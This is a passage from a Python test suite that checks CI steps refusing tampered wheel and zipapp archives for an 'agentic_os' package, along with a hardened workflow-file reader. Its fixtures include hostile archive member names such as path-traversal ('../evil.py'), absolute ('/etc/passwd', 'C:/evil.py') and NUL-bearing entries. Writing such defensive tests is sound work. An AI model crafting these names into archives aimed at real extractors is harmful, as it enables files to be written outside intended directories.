        compile(cls.block, cls.STEP_NAME, "exec")  # the extracted source is valid Python

    def _fixture(self):
        source_root = Path(tempfile.mkdtemp(prefix="aos-dg-src-"))
        self.addCleanup(shutil.rmtree, source_root, ignore_errors=True)
        package, catalog = _synthetic_source_tree(source_root)
        runner_temp = Path(tempfile.mkdtemp(prefix="aos-dg-rt-"))
        self.addCleanup(shutil.rmtree, runner_temp, ignore_errors=True)
        return source_root, runner_temp, package, catalog


class WheelMembershipBlockTests(_MembershipBlockTestBase):
    """Execute the real 'Assert wheel membership' block against valid and
    hostile wheel-shaped fixtures created outside the repository."""

    STEP_NAME = "Assert wheel membership"

    @staticmethod
    def _valid_items(package, catalog):
        return (
            list(package.items())
            + list(catalog.items())
            + [
                ("agentic_os-1.0.dist-info/METADATA", b"Metadata-Version: 2.1\n"),
                ("agentic_os-1.0.dist-info/RECORD", b"\n"),
                ("agentic_os-1.0.dist-info/WHEEL", b"Wheel-Version: 1.0\n"),
            ]
        )

    def _place(self, runner_temp, items):
        (runner_temp / "dist").mkdir(exist_ok=True)
        _write_zip(runner_temp / "dist" / "agentic_os-1.0-py3-none-any.whl", items)

    def test_valid_canonical_wheel_fixture_passes(self):
        source_root, runner_temp, package, catalog = self._fixture()
        self._place(runner_temp, self._valid_items(package, catalog))
        result = _run_block(self.block, source_root, runner_temp)
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
        self.assertIn(b"wheel membership OK", result.stdout)

    def test_hostile_wheels_fail_closed(self):
        extra_py = ("agentic_os/extra.py", b"x = 1\n")
        extra_catalog = ("agentic_os/catalog/extra.json", b"{}\n")
        mutations = {
            "duplicate member": lambda base: base + [("agentic_os/cli.py", b"dup")],
            "traversal member": lambda base: base + [("agentic_os/../evil.py", b"x")],
            "absolute member": lambda base: base + [("/etc/passwd", b"x")],
            "backslash member": lambda base: base + [("agentic_os\\evil.py", b"x")],
            "case collision": lambda base: base + [("agentic_os/CLI.py", b"x")],
            "unexpected top-level member": lambda base: base + [("setup.py", b"x")],
            "unexpected directory entry": lambda base: base + [("evil/", b"")],
            "second dist-info root": lambda base: base
            + [("agentic_os-9.9.9.dist-info/METADATA", b"x")],
            "modified package bytes": lambda base: _with(base, "agentic_os/cli.py", b"MUTATED\n"),
            "missing package module": lambda base: _without(base, "agentic_os/cli.py"),
            "extra package module": lambda base: base + [extra_py],
            "modified catalog json": lambda base: _with(
                base, "agentic_os/catalog/manifest.json", b"MUTATED\n"
            ),
            "missing catalog json": lambda base: _without(
                base, "agentic_os/catalog/manifest.json"
            ),
            "extra catalog json": lambda base: base + [extra_catalog],
        }
        for label, mutate in mutations.items():
            with self.subTest(case=label):
                source_root, runner_temp, package, catalog = self._fixture()
                self._place(runner_temp, mutate(self._valid_items(package, catalog)))
                result = _run_block(self.block, source_root, runner_temp)
                self.assertEqual(
                    result.returncode, 1, f"{label}: expected refusal\n{result.stdout}{result.stderr}"
                )
                self.assertTrue(result.stdout.startswith(b"wheel:"), result.stdout)

    def test_more_than_one_wheel_is_refused(self):
        source_root, runner_temp, package, catalog = self._fixture()
        self._place(runner_temp, self._valid_items(package, catalog))
        _write_zip(
            runner_temp / "dist" / "agentic_os-2.0-py3-none-any.whl",
            self._valid_items(package, catalog),
        )
        result = _run_block(self.block, source_root, runner_temp)
        self.assertEqual(result.returncode, 1, result.stdout + result.stderr)

    def test_hostile_wheel_member_names_fail_closed(self):
        """Correction A cases 1-8: drive-like absolute/relative, NUL-bearing,
        empty, empty/dot path components, and nested / bare-file `.dist-info`
        members. Each is added to an otherwise-valid wheel and must drive the
        REAL extracted block to a nonzero exit.

        Observed CPython zipfile behavior (verified on 3.12, and by design on
        3.14): a member name is truncated at its first NUL before the central
        directory records it, so the block never sees the NUL. The NUL case
        therefore proves refusal of the *constructed archive* via the survivor
        name ``agentic_os/evil.py`` — refused as an unexpected member — and does
        NOT claim the internal ``"\\x00" in name`` guard was reached.
        """
        cases = {
            # label -> (hostile member name, whether zipfile truncates at NUL)
            "drive-like absolute member": "C:/evil.py",
            "drive-like relative member": "c:evil.py",
            "NUL-bearing member (truncated by zipfile to agentic_os/evil.py)":
                "agentic_os/evil.py\x00.py",
            "empty member name": "",
            "empty path component": "agentic_os//evil.py",
            "dot path component": "agentic_os/./evil.py",
            "nested .dist-info member": "agentic_os-1.0.dist-info/licenses/LICENSE",
            "bare .dist-info root as a non-directory file": "agentic_os-1.0.dist-info",
        }
        for label, member in cases.items():
            with self.subTest(case=label):
                source_root, runner_temp, package, catalog = self._fixture()
                items = self._valid_items(package, catalog) + [(member, b"x")]
                self._place(runner_temp, items)
                result = _run_block(self.block, source_root, runner_temp)
                self.assertEqual(
                    result.returncode, 1,
                    f"{label}: expected refusal\n{result.stdout}{result.stderr}",
                )
                self.assertTrue(result.stdout.startswith(b"wheel:"), result.stdout)

    def test_hostile_wheel_source_tree_shapes_fail_closed(self):
        """Correction A cases 9-10: source-tree preconditions the block reads
        from the working directory. A tree with no package Python modules, and a
        tree whose ``agentic_os/catalog`` json count is not exactly 13, each
        drive the REAL extracted block to a nonzero exit before the wheel is
        even opened."""
        with self.subTest(case="source tree with no package Python modules"):
            source_root, runner_temp, package, catalog = self._fixture()
            for module in (source_root / "agentic_os").rglob("*.py"):
                module.unlink()
            self._place(runner_temp, self._valid_items(package, catalog))
            result = _run_block(self.block, source_root, runner_temp)
            self.assertEqual(result.returncode, 1, result.stdout + result.stderr)
            self.assertTrue(result.stdout.startswith(b"wheel:"), result.stdout)

        with self.subTest(case="source tree with a catalog count other than 13"):
            source_root, runner_temp, package, catalog = self._fixture()
            (source_root / "agentic_os" / "catalog" / "extra.json").write_bytes(b"{}\n")
            self._place(runner_temp, self._valid_items(package, catalog))
            result = _run_block(self.block, source_root, runner_temp)
            self.assertEqual(result.returncode, 1, result.stdout + result.stderr)
            self.assertTrue(result.stdout.startswith(b"wheel:"), result.stdout)


class ZipappMembershipBlockTests(_MembershipBlockTestBase):
    """Execute the real 'Assert zipapp membership' block against valid and
    hostile fixtures, and against an actual archive from tools/build_zipapp.py."""

    STEP_NAME = "Assert zipapp membership"

    @staticmethod
    def _valid_items(package, catalog):
        root_main = package["agentic_os/__main__.py"]
        return (
            [("__main__.py", root_main)]
            + list(package.items())
            + list(catalog.items())
            + [("agentic_os/", b""), ("agentic_os/catalog/", b"")]
        )

    def _place(self, runner_temp, items):
        _write_zip(runner_temp / "aos.pyz", items)

    def test_valid_canonical_zipapp_fixture_passes(self):
        source_root, runner_temp, package, catalog = self._fixture()
        self._place(runner_temp, self._valid_items(package, catalog))
        result = _run_block(self.block, source_root, runner_temp)
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
        self.assertIn(b"zipapp membership OK", result.stdout)

    def test_real_build_zipapp_output_passes(self):
        """The actual archive tools/build_zipapp.py produces from the real
        source tree passes the block — offline, stdlib-only."""
        builder = _load_build_zipapp()
        runner_temp = Path(tempfile.mkdtemp(prefix="aos-dg-realpyz-"))
        self.addCleanup(shutil.rmtree, runner_temp, ignore_errors=True)
        builder.build(runner_temp / "aos.pyz")
        result = _run_block(self.block, REPO_ROOT, runner_temp)
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
        self.assertIn(b"zipapp membership OK", result.stdout)

    def test_hostile_zipapps_fail_closed(self):
        extra_py = ("agentic_os/extra.py", b"x = 1\n")
        extra_catalog = ("agentic_os/catalog/extra.json", b"{}\n")
        mutations = {
            "duplicate member": lambda base: base + [("agentic_os/cli.py", b"dup")],
            "traversal member": lambda base: base + [("agentic_os/../evil.py", b"x")],
            "absolute member": lambda base: base + [("/etc/passwd", b"x")],
            "backslash member": lambda base: base + [("agentic_os\\evil.py", b"x")],
            "case collision": lambda base: base + [("agentic_os/CLI.py", b"x")],
            "unexpected top-level member": lambda base: base + [("evil.py", b"x")],
            "unexpected directory entry": lambda base: base + [("evil/", b"")],
            "modified root __main__": lambda base: _with(base, "__main__.py", b"MUTATED\n"),
            "modified package module": lambda base: _with(base, "agentic_os/cli.py", b"MUTATED\n"),
            "missing package module": lambda base: _without(base, "agentic_os/cli.py"),
            "extra package module": lambda base: base + [extra_py],
            "modified catalog json": lambda base: _with(
                base, "agentic_os/catalog/manifest.json", b"MUTATED\n"
            ),
            "missing catalog json": lambda base: _without(
                base, "agentic_os/catalog/manifest.json"
            ),
            "extra catalog json": lambda base: base + [extra_catalog],
        }
        for label, mutate in mutations.items():
            with self.subTest(case=label):
                source_root, runner_temp, package, catalog = self._fixture()
                self._place(runner_temp, mutate(self._valid_items(package, catalog)))
                result = _run_block(self.block, source_root, runner_temp)
                self.assertEqual(
                    result.returncode, 1, f"{label}: expected refusal\n{result.stdout}{result.stderr}"
                )
                self.assertTrue(result.stdout.startswith(b"zipapp:"), result.stdout)

    def test_hostile_zipapp_member_names_fail_closed(self):
        """Correction B: drive-like absolute/relative, NUL-bearing, empty, and
        empty/dot path-component member names each drive the REAL extracted
        zipapp block to a nonzero exit. No ``.dist-info`` cases: ``.dist-info``
        is not a valid zipapp payload.

        As in the wheel block, CPython zipfile truncates a member name at its
        first NUL, so the NUL construction is refused via its survivor name
        ``agentic_os/evil.py`` (an unexpected member), not via the internal NUL
        guard.
        """
        cases = {
            "drive-like absolute member": "C:/evil.py",
            "drive-like relative member": "c:evil.py",
            "NUL-bearing member (truncated by zipfile to agentic_os/evil.py)":
                "agentic_os/evil.py\x00.py",
            "empty member name": "",
            "empty path component": "agentic_os//evil.py",
            "dot path component": "agentic_os/./evil.py",
        }
        for label, member in cases.items():
            with self.subTest(case=label):
                source_root, runner_temp, package, catalog = self._fixture()
                items = self._valid_items(package, catalog) + [(member, b"x")]
                self._place(runner_temp, items)
                result = _run_block(self.block, source_root, runner_temp)
                self.assertEqual(
                    result.returncode, 1,
                    f"{label}: expected refusal\n{result.stdout}{result.stderr}",
                )
                self.assertTrue(result.stdout.startswith(b"zipapp:"), result.stdout)


class VerifierInputHardeningTests(VerifierTestBase):
    """The bounded, regular-file-only reader: existing reason codes only,
    value-free diagnostics, no traceback, non-mutating, never blocking."""

    def setUp(self):
        self.dir = Path(tempfile.mkdtemp(prefix="aos-verify-input-"))
        self.addCleanup(shutil.rmtree, self.dir, ignore_errors=True)
        self.payload = self.canonical.encode("utf-8")

    def _target(self, name: str, data: bytes) -> Path:
        path = self.dir / name
        path.write_bytes(data)
        return path

    def test_regular_canonical_file_is_accepted(self):
        target = self._target("ci.yml", self.payload)
        code, out, err = self.run_argv(["--workflow", str(target)])
        self.assertEqual(code, 0, out + err)
        self.assertEqual(out, "")

    def test_missing_file_is_missing_workflow(self):
        code, out, _ = self.run_argv(["--workflow", str(self.dir / "absent.yml")])
        self.assertEqual(code, 1)
        self.assertEqual(out, "missing_workflow\n")

    def test_directory_target_is_unexpected_shape(self):
        code, out, _ = self.run_argv(["--workflow", str(self.dir)])
        self.assertEqual(code, 1)
        self.assertEqual(out, "unexpected_workflow_shape\n")

    def test_symlink_target_is_refused_and_left_untouched(self):
        real = self._target("real.yml", self.payload)
        link = self.dir / "link.yml"
        link.symlink_to(real)
        code, out, _ = self.run_argv(["--workflow", str(link)])
        self.assertEqual(code, 1)
        self.assertEqual(out, "unexpected_workflow_shape\n")
        self.assertTrue(link.is_symlink())
        self.assertEqual(real.read_bytes(), self.payload)

    @unittest.skipUnless(hasattr(os, "mkfifo"), "platform lacks a FIFO primitive")
    def test_fifo_target_is_refused_without_blocking(self):
        """Correction D: a writerless FIFO must be refused promptly. The REAL
        verifier CLI runs in a subprocess under a bounded timeout, so a future
        regression to a blocking open fails THIS test deterministically instead
        of hanging the whole suite. No writer is ever opened; `subprocess.run`
        kills and reaps the child on timeout, leaving no background process, and
        the FIFO is removed by the setUp-registered cleanup even on failure."""
        fifo = self.dir / "fifo.yml"
        os.mkfifo(fifo)
        self.assertTrue(stat.S_ISFIFO(os.lstat(fifo).st_mode))
        try:
            result = subprocess.run(
                [sys.executable, str(VERIFIER_PATH), "--workflow", str(fifo)],
                capture_output=True,
                timeout=5,
            )
        except subprocess.TimeoutExpired:
            self.fail(
                "verifier blocked on a writerless FIFO — regression to a blocking open"
            )
        self.assertEqual(result.returncode, 1, result.stderr.decode(errors="replace"))
        self.assertEqual(result.stdout.decode(), "unexpected_workflow_shape\n")
        self.assertTrue(stat.S_ISFIFO(os.lstat(fifo).st_mode))

    def test_oversized_regular_file_is_unexpected_shape(self):
        target = self._target("big.yml", b"x" * (self.vcw.MAX_WORKFLOW_BYTES + 1))
        code, out, _ = self.run_argv(["--workflow", str(target)])
        self.assertEqual(code, 1)
        self.assertEqual(out, "unexpected_workflow_shape\n")

    def test_invalid_utf8_is_reported(self):
        target = self._target("bad.yml", b"\xff\xfe not utf-8\n")
        code, out, _ = self.run_argv(["--workflow", str(target)])
        self.assertEqual(code, 1)
        self.assertEqual(out, "invalid_utf8\n")

    def test_crlf_is_reported(self):
        target = self._target("crlf.yml", self.canonical.replace("\n", "\r\n").encode("utf-8"))
        code, out, _ = self.run_argv(["--workflow", str(target)])
        self.assertEqual(code, 1)
        self.assertEqual(out, "crlf_present\n")

    def test_bom_prefixed_canonical_is_unexpected_shape(self):
        target = self._target("bom.yml", b"\xef\xbb\xbf" + self.payload)
        code, out, _ = self.run_argv(["--workflow", str(target)])
        self.assertEqual(code, 1)
        self.assertEqual(self.codes(out), ["unexpected_workflow_shape"])

    def test_internal_failure_is_value_free_internal_error(self):
        target = self._target("ci.yml", self.payload)
        with mock.patch.object(self.vcw, "_check_actions", side_effect=RuntimeError("boom")):
            code, out, err = self.run_argv(["--workflow", str(target)])
        self.assertEqual(code, 1)
        self.assertEqual(out, "internal_error\n")
        self.assertNotIn("Traceback", out + err)
        self.assertNotIn("boom", out + err)

    def test_reader_outcomes_use_only_frozen_codes(self):
        seen: set[str] = set()
        for data in (self.dir / "absent.yml",):
            _, out, _ = self.run_argv(["--workflow", str(data)])
            seen.update(self.codes(out))
        for path in (str(self.dir), str(self._target("big2.yml", b"x" * (self.vcw.MAX_WORKFLOW_BYTES + 2)))):
            _, out, _ = self.run_argv(["--workflow", path])
            seen.update(self.codes(out))
        self.assertLessEqual(seen, FROZEN_REASON_CODES)
        self.assertEqual(seen, {"missing_workflow", "unexpected_workflow_shape"})

    def test_reader_does_not_mutate_the_target(self):
        target = self._target("ci.yml", self.payload)
        self.run_argv(["--workflow", str(target)])
        self.assertEqual(target.read_bytes(), self.payload)

    def test_character_device_target_is_unexpected_shape(self):
        """Correction C: a character device (fstat reports S_ISCHR, not
        S_ISREG) is refused as `unexpected_workflow_shape` with no traceback and
        no path/value leakage. Skipped only where no character device exists."""
        dev = "/dev/null"
        if not (os.path.exists(dev) and stat.S_ISCHR(os.stat(dev).st_mode)):
            self.skipTest("no character device equivalent to /dev/null available")
        code, out, err = self.run_argv(["--workflow", dev])
        self.assertEqual(code, 1)
        self.assertEqual(out, "unexpected_workflow_shape\n")
        self.assertNotIn("Traceback", out + err)
        self.assertNotIn(dev, out + err)

    @unittest.skipUnless(hasattr(socket, "AF_UNIX"), "platform lacks AF_UNIX sockets")
    def test_unix_socket_target_is_missing_workflow(self):
        """Correction C: opening a bound AF_UNIX socket path raises ENXIO, which
        the reader maps to the implementation's frozen `missing_workflow`
        classification. Value-free, no traceback; the socket is closed and its
        path removed deterministically, even if an assertion fails."""
        sock_path = self.dir / "target.sock"
        server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        server.bind(str(sock_path))
        try:
            self.assertTrue(stat.S_ISSOCK(os.lstat(sock_path).st_mode))
            code, out, err = self.run_argv(["--workflow", str(sock_path)])
            self.assertEqual(code, 1)
            self.assertEqual(out, "missing_workflow\n")
            self.assertNotIn("Traceback", out + err)
            self.assertNotIn(str(sock_path), out + err)
        finally:
            server.close()
            if sock_path.exists():
                sock_path.unlink()

    def test_eacces_target_is_missing_workflow(self):
        """Correction C: an unreadable target. Rather than rely on chmod 000 (a
        privileged runner may still read it), the verifier module's `os.open`
        boundary is patched to raise PermissionError(EACCES) for this exact
        path; the real `main()` then maps the failed open to `missing_workflow`.
        The patch is restored automatically by the context manager, no finding
        is constructed directly, and output is value-free with no traceback.

        The target is a real, readable, canonical file, so only the injected
        EACCES can produce the refusal — proving the reader's real open path
        (not a byte-content check) was exercised."""
        target = self._target("ci.yml", self.payload)
        real_open = os.open

        def fake_open(path, *args, **kwargs):
            if os.fspath(path) == str(target):
                raise PermissionError(errno.EACCES, "Permission denied")
            return real_open(path, *args, **kwargs)

        with mock.patch.object(self.vcw.os, "open", side_effect=fake_open):
            code, out, err = self.run_argv(["--workflow", str(target)])
        self.assertEqual(code, 1)
        self.assertEqual(out, "missing_workflow\n")
        self.assertNotIn("Traceback", out + err)
        self.assertNotIn(str(target), out + err)
        self.assertNotIn("Permission denied", out + err)


if __name__ == "__main__":
    unittest.main()
